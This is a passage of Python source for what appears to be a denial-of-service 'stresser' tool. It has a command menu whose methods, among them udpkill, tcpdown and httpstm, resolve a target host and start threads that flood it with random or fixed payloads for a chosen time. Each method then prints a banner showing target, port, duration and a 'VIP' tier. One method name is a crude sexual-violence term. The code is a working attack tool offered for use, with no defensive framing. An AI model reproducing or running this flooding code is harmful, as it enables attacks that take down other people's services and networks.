        \033[31mMETHODS: \033[31m[\033[37mstresster\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "dstats-l7":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mdstats-l7\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "httpstm":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mhttpstm\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))      
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "httpcld":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mhttpcld\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))             
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ddosguard":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mddosguard\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpdown":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1021
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mudpdown\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpkill":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 666
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mudpkill\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcprape":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mtcprape\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                   
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcpraw":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mtcpraw\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                   
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcpdown":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 102400
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mtcpdown\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[93mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                   
            except ValueError:
                main()
            except socket.gaierror:
                main()
                
        elif sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True

        else:
            main()


try:
    clear = "clear"
    os.system("clear")
    print(banner)
    main()
except KeyboardInterrupt:
    exit()
